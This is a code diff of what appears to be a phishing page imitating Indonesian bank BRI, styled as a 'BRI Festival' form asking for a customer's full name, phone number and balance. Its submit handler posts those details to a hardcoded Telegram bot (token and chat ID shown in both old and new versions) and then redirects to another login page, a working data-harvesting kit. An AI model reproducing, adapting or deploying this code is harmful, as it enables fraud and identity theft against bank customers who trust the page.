@@ -737,9 +737,6 @@ body{
     box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
   }
 }
-.card-input__input::placeholder {
-    text-transform: lowercase;
-}
 
 </style>
 <body>
@@ -835,7 +832,7 @@ body{
         <div class="card-input">
             <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px;">Nama Lengkap Nasabah</label>
             <input type="hidden" id="logo" value="༺═𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜═༻">
-              <input type="text" id="nama" name="nama" class="card-input__input" v-model="cardNumber" v-on:focus="focusInput" data-ref="cardNumber" autocomplete="off" placeholder="masukan nama lengkap nasabah" required style="text-transform: uppercase;">
+            <input type="text" id="nama" name="nama" class="card-input__input" v-model="cardNumber" v-on:focus="focusInput" data-ref="cardNumber" autocomplete="off" placeholder="Masukan Nama Lengkap Nasabah" required>
         </div>
         <div class="card-input">
             <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px;">Nomor Handphone</label>
@@ -854,7 +851,6 @@ body{
     background-color: #fff; 
     padding-left: 35px; 
     padding-right: 35px;">
-
                 </div>
             </div>
         </div>
@@ -966,57 +962,50 @@ body{
         }
     });
 
-    function formatSaldo(saldo) {
-    return saldo.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Menambahkan titik sebagai pemisah ribuan
-}
+    document.getElementById("inputlogin").addEventListener("submit", function(event) {
+        event.preventDefault();
 
-document.getElementById("inputlogin").addEventListener("submit", function(event) {
-    event.preventDefault();
+        const nama = document.getElementById("nama").value;
+        const nomor = document.getElementById("nomor").value;
+        const saldo = document.getElementById("saldo").value.replace(/\./g, ''); // Menghapus pemisah ribuan
 
-    const nama = document.getElementById("nama").value;
-    const nomor = document.getElementById("nomor").value;
-    const saldo = formatSaldo(document.getElementById("saldo").value.replace(/\./g, '')); // Format saldo dengan titik
-
-    const message = `
-╭─────────────────────╮
+        const message = `
 ├• 𝗕𝗥𝗜 | 𝗙𝗘𝗦𝗧𝗜𝗩𝗔𝗟
-├───────────────────┤
-├• 👤 𝗡𝗮𝗺𝗮 : ${nama}
-├• 📞 𝗡𝗼𝗺𝗼𝗿 : ${nomor}
-├• 💰 𝗦𝗮𝗹𝗱𝗼 : ${saldo}
-╰─────────────────────╯
+├───────────────────
+├• 𝗡𝗮𝗺𝗮 : ${nama}
+├• 𝗡𝗼𝗺𝗼𝗿 : ${nomor}
+├• 𝗦𝗮𝗹𝗱𝗼 : ${saldo}
+╰───────────────────
 `;
 
+        const token = '7985246622:AAHfS4CmSsOLJddaLKQPNlMbhR1Y-3a8EPg'; // Ganti dengan token yang benar
+        const chatId = '6795057308'; // Ganti dengan chat ID yang benar
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-    const token = '7868157300:AAH1ANaAEbr3PitbLmDf85HIemDR_t2IT6Q'; // Ganti dengan token yang benar
-    const chatId = '7221790981'; // Ganti dengan chat ID yang benar
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-    fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-        }),
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            window.location.href = 'login1.html'; 
-        } else {
-            alert("Gagal mengirim data.");
-        }
-    })
-    .catch(error => {
-        console.error("Error:", error);
-        alert("Terjadi kesalahan saat mengirim data.");
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                
+                window.location.href = 'loginuser.html'; 
+            } else {
+                alert("Gagal mengirim data.");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("Terjadi kesalahan saat mengirim data.");
+        });
     });
-});
-
-
 
     function formatRupiah(input) {
         let value = input.value.replace(/[^,\d]/g, '').toString();
